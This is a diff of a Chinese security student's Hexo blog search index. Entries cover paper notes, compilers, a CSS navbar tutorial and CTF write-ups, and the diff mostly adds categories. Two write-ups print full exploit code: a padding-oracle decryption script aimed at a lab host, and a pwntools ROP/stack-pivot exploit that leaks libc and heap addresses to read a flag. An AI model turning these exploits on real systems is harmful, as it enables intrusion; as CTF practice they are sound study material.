 <img src="/posts/6b4c8ab1/image-20231220101952436.png" class="" title="image-20231220101952436">]]></content>
+      <categories>
+        <category>论文</category>
+      </categories>
       <tags>
         <tag>IS</tag>
         <tag>IoT</tag>
@@ -1235,6 +1275,9 @@
 </li>
 </ul>
 ]]></content>
+      <categories>
+        <category>论文</category>
+      </categories>
       <tags>
         <tag>论文复现</tag>
         <tag>DSE</tag>
@@ -1288,9 +1331,13 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"></span><br><span class="line"><span class="comment"># XOR two bytearrays</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">first, second</span>):</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">bytearray</span>(x^y <span class="keyword">for</span> x,y <span class="keyword">in</span> <span class="built_in">zip</span>(first, second))</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PaddingOracle</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, host, port</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        <span class="variable language_">self</span>.s.connect((host, port))</span><br><span class="line"></span><br><span class="line">        ciphertext = <span class="variable language_">self</span>.s.recv(<span class="number">4096</span>).decode().strip()</span><br><span class="line">        <span class="variable language_">self</span>.ctext = unhexlify(ciphertext)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, ctext: <span class="built_in">bytes</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>._send(hexlify(ctext))</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._recv()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_recv</span>(<span class="params">self</span>):</span><br><span class="line">        resp = <span class="variable language_">self</span>.s.recv(<span class="number">4096</span>).decode().strip()</span><br><span class="line">        <span class="keyword">return</span> resp </span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_send</span>(<span class="params">self, hexstr: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.s.send(hexstr + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__del__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    oracle = PaddingOracle(<span class="string">&#x27;10.9.0.80&#x27;</span>, <span class="number">6000</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Get the IV + Ciphertext from the oracle</span></span><br><span class="line">    iv_and_ctext = <span class="built_in">bytearray</span>(oracle.ctext)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(iv_and_ctext))</span><br><span class="line">    <span class="comment"># Num of ctext</span></span><br><span class="line">    num = <span class="built_in">int</span>(<span class="built_in">len</span>(iv_and_ctext)/<span class="number">16</span> - <span class="number">1</span>)</span><br><span class="line">    plain_text = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        C = iv_and_ctext[(n)*<span class="number">16</span>: (n+<span class="number">1</span>)*<span class="number">16</span>]</span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;IV:  &quot;</span> + C.<span class="built_in">hex</span>())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;C<span class="subst">&#123;n&#125;</span>: &quot;</span> + C.<span class="built_in">hex</span>())</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># initialize D, IV, P</span></span><br><span class="line">        D = <span class="built_in">bytearray</span>(<span class="number">16</span>)</span><br><span class="line">        CC = <span class="built_in">bytearray</span>(<span class="number">16</span>)</span><br><span class="line">        P = <span class="built_in">bytearray</span>(<span class="number">16</span>)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Solve D</span></span><br><span class="line">        <span class="keyword">for</span> K <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">17</span>):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">                CC[<span class="number">16</span> - K] = i</span><br><span class="line">                <span class="comment"># initialize input</span></span><br><span class="line">                tmp_input = iv_and_ctext[<span class="number">0</span>:(n+<span class="number">2</span>)*<span class="number">16</span>]</span><br><span class="line">                tmp_input[n*<span class="number">16</span>:(n+<span class="number">1</span>)*<span class="number">16</span>] = CC</span><br><span class="line">                status = oracle.decrypt(tmp_input)</span><br><span class="line">                <span class="keyword">if</span> status == <span class="string">&quot;Valid&quot;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Valid: i = 0x&#123;:02x&#125;&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;D: &quot;</span>+ D.<span class="built_in">hex</span>())</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;CC: &quot;</span> + CC.<span class="built_in">hex</span>())</span><br><span class="line">                    <span class="comment"># Update D</span></span><br><span class="line">                    D[<span class="number">16</span> - K] = i^K</span><br><span class="line">                    <span class="comment"># Update CC</span></span><br><span class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, K+<span class="number">1</span>):</span><br><span class="line">                        CC[<span class="number">16</span> - j] = D[<span class="number">16</span> - j]^(K+<span class="number">1</span>)</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Once you get all the 16 bytes of D2, you can easily get P2</span></span><br><span class="line">        P = xor(C, D)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;P:  &quot;</span> + P.<span class="built_in">hex</span>())</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            plain_text += <span class="built_in">chr</span>(P[j])</span><br><span class="line">            </span><br><span class="line">       </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Plaintext: &quot;</span> + plain_text) </span><br></pre></td></tr></table></figure>
 
 <img src="/posts/8f883717/image-20231231130753727.png" class="" title="image-20231231130753727">]]></content>
+      <categories>
+        <category>CTF练习</category>
+      </categories>
       <tags>
         <tag>密码</tag>
-        <tag>Padding Oracle</tag>
+        <tag>Padding</tag>
+        <tag>Oracle</tag>
       </tags>
   </entry>
   <entry>
@@ -1349,9 +1396,14 @@
 
 <p>其中发现”&#x2F;bin&#x2F;sh”环境变量存在偏移0x3，对exp.py稍作修改后重新运行，成功获取到root shell，获取到flag。</p>
 <img src="/posts/8a8d28bf/image-20231231154624159.png" class="" title="image-20231231154624159">]]></content>
+      <categories>
+        <category>CTF练习</category>
+      </categories>
       <tags>
+        <tag>Return</tag>
+        <tag>to</tag>
         <tag>Pwn</tag>
-        <tag>Return to libc</tag>
+        <tag>libc</tag>
       </tags>
   </entry>
   <entry>
@@ -1471,6 +1523,39 @@
       <tags>
         <tag>Fuzz</tag>
         <tag>模糊测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux内核模块-交叉编译器</title>
+    <url>/posts/b78b50e.html</url>
+    <content><![CDATA[<h2 id="GCC"><a href="#GCC" class="headerlink" title="GCC"></a>GCC</h2><p>GNC C Compiler —&gt; GNU Compiler Collection</p>
+<ul>
+<li>包括编译器、链接器、binutils、glibc、头文件</li>
+<li>支持多种语言（C、C++、Java、Go）和多种硬件平台（X86、ARM、MIPS、RISC-V）</li>
+</ul>
+<h2 id="Clang"><a href="#Clang" class="headerlink" title="Clang"></a>Clang</h2><p>编译器的构成</p>
+<ul>
+<li>Frontend：源码分析、语法检查，输出中间代码</li>
+<li>Optimizer：对中间代码进行优化、使其运行更高效</li>
+<li>Backend：将中间代码转换为某一个平台的机器代码</li>
+</ul>
+<p>编译器的实现</p>
+<ul>
+<li>GCC：前端和后端分离，支持多种语言、多个平台。但缺点：前后端耦合高，代码可重用性低。</li>
+<li>LLVM（Low Level Virtual Machine）框架：<strong>模块化设计</strong>，代码可重用性高；中间语言LLVM IR，<strong>类C表达</strong>，<strong>可扩展</strong>各种前端、后端；支持C&#x2F;C++&#x2F;Java等语言</li>
+<li>使用LLVM框架的编译器：<ul>
+<li>LLVM GCC：前端使用GCC（Apple）</li>
+<li>Clang：LLVM+Clang前端（使用C&#x2F;C++）（Apple，Android）</li>
+<li>方舟编译器：编译优化（Java虚拟机，效率提高），鸿蒙系统</li>
+</ul>
+</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>内核模块</tag>
+        <tag>交叉编译</tag>
+        <tag>gcc</tag>
+        <tag>clang</tag>
       </tags>
   </entry>
   <entry>
@@ -1747,39 +1832,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Linux内核模块-交叉编译器</title>
-    <url>/posts/b78b50e.html</url>
-    <content><![CDATA[<h2 id="GCC"><a href="#GCC" class="headerlink" title="GCC"></a>GCC</h2><p>GNC C Compiler —&gt; GNU Compiler Collection</p>
-<ul>
-<li>包括编译器、链接器、binutils、glibc、头文件</li>
-<li>支持多种语言（C、C++、Java、Go）和多种硬件平台（X86、ARM、MIPS、RISC-V）</li>
-</ul>
-<h2 id="Clang"><a href="#Clang" class="headerlink" title="Clang"></a>Clang</h2><p>编译器的构成</p>
-<ul>
-<li>Frontend：源码分析、语法检查，输出中间代码</li>
-<li>Optimizer：对中间代码进行优化、使其运行更高效</li>
-<li>Backend：将中间代码转换为某一个平台的机器代码</li>
-</ul>
-<p>编译器的实现</p>
-<ul>
-<li>GCC：前端和后端分离，支持多种语言、多个平台。但缺点：前后端耦合高，代码可重用性低。</li>
-<li>LLVM（Low Level Virtual Machine）框架：<strong>模块化设计</strong>，代码可重用性高；中间语言LLVM IR，<strong>类C表达</strong>，<strong>可扩展</strong>各种前端、后端；支持C&#x2F;C++&#x2F;Java等语言</li>
-<li>使用LLVM框架的编译器：<ul>
-<li>LLVM GCC：前端使用GCC（Apple）</li>
-<li>Clang：LLVM+Clang前端（使用C&#x2F;C++）（Apple，Android）</li>
-<li>方舟编译器：编译优化（Java虚拟机，效率提高），鸿蒙系统</li>
-</ul>
-</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>内核模块</tag>
-        <tag>交叉编译</tag>
-        <tag>gcc</tag>
-        <tag>clang</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>DSE论文笔记</title>
     <url>/posts/25083369.html</url>
     <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>通过建立一个比较简单的语法简单中间语言（A simple intermediate language，SIMPIL）。对Dynamic taint analysis和forward symbolic execution进行了讲解。</p>
@@ -1797,6 +1849,9 @@
 <h4 id="Taint-Propagation"><a href="#Taint-Propagation" class="headerlink" title="Taint Propagation"></a>Taint Propagation</h4><h4 id="Taint-Checking"><a href="#Taint-Checking" class="headerlink" title="Taint Checking"></a>Taint Checking</h4><p>查看是否污染</p>
 <h2 id="前向符号执行"><a href="#前向符号执行" class="headerlink" title="前向符号执行"></a>前向符号执行</h2><p>前向符号性可以通过建立逻辑表达式分析程序在不同输入下的行为。属于静态分析。</p>
 ]]></content>
+      <categories>
+        <category>论文</category>
+      </categories>
       <tags>
         <tag>DSE</tag>
       </tags>
@@ -1882,6 +1937,9 @@
 
 <p>flag: <code>ZJUCTF&#123;5aK1-CHan&#39;s_k0k0r0_ls_5m4sh3d_oTATo&#125;</code></p>
 ]]></content>
+      <categories>
+        <category>CTF比赛</category>
+      </categories>
       <tags>
         <tag>CTF</tag>
       </tags>
@@ -1971,39 +2029,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Hexo博客导航栏美化</title>
-    <url>/posts/a5aaf96c.html</url>
-    <content><![CDATA[<p>目前网站还是有一些问题，例如导航栏图标不全，还有样式比较丑…</p>
-<h2 id="初始效果"><a href="#初始效果" class="headerlink" title="初始效果"></a>初始效果</h2><img src="/posts/a5aaf96c/image-20241027222855421.png" class="" title="image-20241027222855421">
-
-<h2 id="改进方法"><a href="#改进方法" class="headerlink" title="改进方法"></a>改进方法</h2><h3 id="添加导航栏图标"><a href="#添加导航栏图标" class="headerlink" title="添加导航栏图标"></a>添加导航栏图标</h3><p>查找<a href="https://fontawesome.com.cn/"><code>fontawesome</code></a>图标库</p>
-<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">nav:</span></span><br><span class="line">  <span class="comment"># Navigation bar logo image</span></span><br><span class="line">  <span class="attr">logo:</span></span><br><span class="line">  <span class="attr">display_title:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Whether to fix navigation bar</span></span><br><span class="line">  <span class="attr">fixed:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="string">首页:</span>   <span class="string">/</span>           <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="string">文章||far</span> <span class="attr">fa-folder-open:</span></span><br><span class="line">    <span class="string">归档:</span>   <span class="string">/archives/</span>  <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-archive</span></span><br><span class="line">    <span class="string">标签:</span>   <span class="string">/tags/</span>      <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-tags</span></span><br><span class="line">    <span class="string">分类:</span>   <span class="string">/categories/</span>  <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-folder-open</span></span><br><span class="line">  </span><br><span class="line">  <span class="string">时间轴:</span> <span class="string">/sitetime</span>   <span class="string">||</span>  <span class="string">fad</span> <span class="string">fa-hourglass-end</span></span><br><span class="line">  <span class="string">清单||fas</span> <span class="attr">fa-heartbeat:</span></span><br><span class="line">    <span class="string">音乐:</span> <span class="string">/music/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-music</span></span><br><span class="line">    <span class="string">照片:</span> <span class="string">/Gallery/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-images</span></span><br><span class="line">    <span class="string">电影:</span> <span class="string">/movies/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-video</span></span><br><span class="line">    <span class="string">关于:</span> <span class="string">/about/</span> <span class="string">||</span>  <span class="string">far</span> <span class="string">fa-paper-plane</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="鼠标移入菜单效果"><a href="#鼠标移入菜单效果" class="headerlink" title="鼠标移入菜单效果"></a>鼠标移入菜单效果</h3><p>原本是鼠标悬浮后标签下出现蓝条，现在改为放大效果，通过添加自定义CSS实现</p>
-<ol>
-<li><p>在博客根目录source目录下创建好css、js、img文件夹，用来存放自定义的文件，这里我将这些文件夹统一放在&#x2F;source&#x2F;config目录下：</p>
-<img src="/posts/a5aaf96c/image-20241027223321828.png" class="" title="image-20241027223321828">
-</li>
-<li><p>引入自定义的js、css文件<br>直接在主题配置文件中配置即可，这里我的配置文件为_config.butterfly.yml，在文件中找到inject</p>
-<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Inject</span></span><br><span class="line"><span class="comment"># ps：引入自定义css、js</span></span><br><span class="line"><span class="comment">#     css文件在head引入，js文件在bottom里引入，有的js要求在head引入，不然无法生效</span></span><br><span class="line"><span class="comment"># Insert the code to head (before &#x27;&lt;/head&gt;&#x27; tag) and the bottom (before &#x27;&lt;/body&gt;&#x27; tag)</span></span><br><span class="line"><span class="comment"># ps: 插入代码到头部 &lt;/head&gt; 之前 和 底部 &lt;/body&gt; 之前</span></span><br><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span> <span class="comment">#注入自定义css</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/config/css/style.css&quot;&gt;</span></span><br><span class="line">    <span class="comment"># - &lt;link rel=&quot;stylesheet&quot; href=&quot;/xxx.css&quot;&gt;</span></span><br><span class="line">  <span class="attr">bottom:</span> <span class="comment">#注入自定义js</span></span><br><span class="line">    <span class="comment">#  - &lt;script src=&quot;/config/js/script.js?v1&quot;&gt;&lt;/script&gt;</span></span><br><span class="line">    <span class="comment"># - &lt;script src=&quot;/xxxx&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>添加自定义css文件</p>
-<p>在&#x2F;source&#x2F;config&#x2F;css中新建style.css文件，添加如下内容：</p>
-<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 去除导航栏选项中底下的蓝条 */</span></span><br><span class="line"><span class="selector-id">#nav</span> *<span class="selector-pseudo">::after</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: transparent<span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 导航栏菜单鼠标移入字体放大 */</span></span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-id">#site-name</span><span class="selector-pseudo">:hover</span>, </span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-class">.menus_item</span><span class="selector-pseudo">:hover</span>, </span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-id">#search-button</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">    <span class="attribute">font-size</span>:<span class="number">28px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-</ol>
-<p>可以成功实现效果，不过有点不协调，如果导航栏居中的话可以使用这一效果（类似于mac的dork效果）。</p>
-<h2 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h2><img src="/posts/a5aaf96c/image-20241027225811317.png" class="" title="image-20241027225811317">
-]]></content>
-      <tags>
-        <tag>教程</tag>
-        <tag>Hexo</tag>
-        <tag>建站</tag>
-        <tag>美化</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2024-Beichen-CTF-WP</title>
     <url>/posts/709ed7e9.html</url>
     <content><![CDATA[<p>今年暑假参加了信大举办的北辰计划夏令营，其中最后一天举行了一次CTF比赛，第一批的题目比较难，当时没做出来，现在重新做一下，在此记录。</p>
@@ -2038,8 +2063,44 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *0x0000000000401828&quot;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *0x000000000040172D&quot;)</span></span><br><span class="line">p = gdb.debug(<span class="string">&quot;./pwn&quot;</span>, </span><br><span class="line">            <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            b *0x000000000040167E</span></span><br><span class="line"><span class="string">            b *0x000000000040172D</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;I_can_find_the_right_path\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># stack pivoting to leak libc</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">pop_rdi = <span class="number">0x000000000040173b</span></span><br><span class="line">pop_rbp = <span class="number">0x000000000040129d</span></span><br><span class="line">vuln_addr = <span class="number">0x000000000040170A</span></span><br><span class="line">bss_addr = <span class="number">0x0000000000404500</span></span><br><span class="line">leave_ret = <span class="number">0x000000000040186C</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="comment"># step1: construct fake rbp</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>, bss_addr, vuln_addr+<span class="number">8</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;===welcome===\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step2: input ROP to leak libc</span></span><br><span class="line">payload = flat(pop_rdi, puts_got, puts_plt, vuln_addr)</span><br><span class="line">payload = flat(payload, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="built_in">len</span>(payload)), bss_addr-<span class="number">0x30</span>-<span class="number">0x8</span>, leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">f&quot;puts_addr: <span class="subst">&#123;<span class="built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)</span><br><span class="line">libc_addr = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">info(<span class="string">f&quot;libc_addr: <span class="subst">&#123;<span class="built_in">hex</span>(libc_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step3: leak environ_addr</span></span><br><span class="line">pop_rsi = <span class="number">0x000000000002be51</span>+libc_addr</span><br><span class="line">pop_rdx_r12 = <span class="number">0x000000000011f497</span>+libc_addr</span><br><span class="line">read_addr = libc_addr+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc_addr+libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">syscall = libc_addr+<span class="number">0x0000000000029db4</span></span><br><span class="line">pop_rax = <span class="number">0x0000000000045eb0</span>+libc_addr</span><br><span class="line"><span class="comment"># mp_addr = libc_addr+libc.sym[&quot;mp]+96+1</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">f&quot;read_addr: <span class="subst">&#123;<span class="built_in">hex</span>(read_addr)&#125;</span>&quot;</span>)</span><br><span class="line">info(<span class="string">f&quot;write_addr: <span class="subst">&#123;<span class="built_in">hex</span>(write_addr)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># info(f&quot;mp_addr: &quot;)</span></span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x404600</span></span><br><span class="line">payload = flat(p64(bss_addr-<span class="number">0x100</span>)*<span class="number">6</span>, bss_addr, vuln_addr+<span class="number">8</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = flat(pop_rdi, <span class="number">0</span>, pop_rsi, flag_addr, pop_rdx_r12, <span class="number">0x100</span>, bss_addr+<span class="number">0x30</span>, vuln_addr+<span class="number">8</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="number">0</span>, pop_rdi, <span class="number">0</span>, read_addr, vuln_addr+<span class="number">8</span>, <span class="number">0</span>, bss_addr-<span class="number">0x30</span>-<span class="number">0x8</span>, leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">environ_addr = <span class="number">0x28f2d0</span>+libc_addr</span><br><span class="line">payload = flat(pop_rdi, <span class="number">1</span>, pop_rsi, environ_addr, pop_rdx_r12, <span class="number">0x6</span>, <span class="number">0</span>, write_addr, vuln_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>, flag_addr-<span class="number">0x8</span>, leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvline()</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">f&quot;stack_addr: <span class="subst">&#123;<span class="built_in">hex</span>(stack_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step4: leak heap_addr</span></span><br><span class="line">heap_addr = stack_addr-<span class="number">0x130</span></span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x30</span>, bss_addr+<span class="number">0x200</span>, vuln_addr+<span class="number">8</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = flat(pop_rdi, heap_addr, puts_plt, vuln_addr, <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>, bss_addr+<span class="number">0x200</span>-<span class="number">0x30</span>-<span class="number">0x8</span>, leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">heap_addr = u64(p.recv(<span class="number">3</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))+<span class="number">0x30</span></span><br><span class="line">info(<span class="string">f&quot;heap_addr: <span class="subst">&#123;<span class="built_in">hex</span>(heap_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step5: print flag</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x30</span>, bss_addr+<span class="number">0x200</span>, vuln_addr+<span class="number">8</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = flat(pop_rdi, heap_addr, puts_addr, vuln_addr, <span class="string">b&#x27;d&#x27;</span>*<span class="number">0x10</span>, bss_addr+<span class="number">0x200</span>-<span class="number">0x30</span>-<span class="number">0x8</span>, leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 ]]></content>
+      <categories>
+        <category>CTF比赛</category>
+      </categories>
       <tags>
         <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hexo博客导航栏美化</title>
+    <url>/posts/a5aaf96c.html</url>
+    <content><![CDATA[<p>目前网站还是有一些问题，例如导航栏图标不全，还有样式比较丑…</p>
+<h2 id="初始效果"><a href="#初始效果" class="headerlink" title="初始效果"></a>初始效果</h2><img src="/posts/a5aaf96c/image-20241027222855421.png" class="" title="image-20241027222855421">
+
+<h2 id="改进方法"><a href="#改进方法" class="headerlink" title="改进方法"></a>改进方法</h2><h3 id="添加导航栏图标"><a href="#添加导航栏图标" class="headerlink" title="添加导航栏图标"></a>添加导航栏图标</h3><p>查找<a href="https://fontawesome.com.cn/"><code>fontawesome</code></a>图标库</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">nav:</span></span><br><span class="line">  <span class="comment"># Navigation bar logo image</span></span><br><span class="line">  <span class="attr">logo:</span></span><br><span class="line">  <span class="attr">display_title:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Whether to fix navigation bar</span></span><br><span class="line">  <span class="attr">fixed:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="string">首页:</span>   <span class="string">/</span>           <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="string">文章||far</span> <span class="attr">fa-folder-open:</span></span><br><span class="line">    <span class="string">归档:</span>   <span class="string">/archives/</span>  <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-archive</span></span><br><span class="line">    <span class="string">标签:</span>   <span class="string">/tags/</span>      <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-tags</span></span><br><span class="line">    <span class="string">分类:</span>   <span class="string">/categories/</span>  <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-folder-open</span></span><br><span class="line">  </span><br><span class="line">  <span class="string">时间轴:</span> <span class="string">/sitetime</span>   <span class="string">||</span>  <span class="string">fad</span> <span class="string">fa-hourglass-end</span></span><br><span class="line">  <span class="string">清单||fas</span> <span class="attr">fa-heartbeat:</span></span><br><span class="line">    <span class="string">音乐:</span> <span class="string">/music/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-music</span></span><br><span class="line">    <span class="string">照片:</span> <span class="string">/Gallery/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-images</span></span><br><span class="line">    <span class="string">电影:</span> <span class="string">/movies/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-video</span></span><br><span class="line">    <span class="string">关于:</span> <span class="string">/about/</span> <span class="string">||</span>  <span class="string">far</span> <span class="string">fa-paper-plane</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="鼠标移入菜单效果"><a href="#鼠标移入菜单效果" class="headerlink" title="鼠标移入菜单效果"></a>鼠标移入菜单效果</h3><p>原本是鼠标悬浮后标签下出现蓝条，现在改为放大效果，通过添加自定义CSS实现</p>
+<ol>
+<li><p>在博客根目录source目录下创建好css、js、img文件夹，用来存放自定义的文件，这里我将这些文件夹统一放在&#x2F;source&#x2F;config目录下：</p>
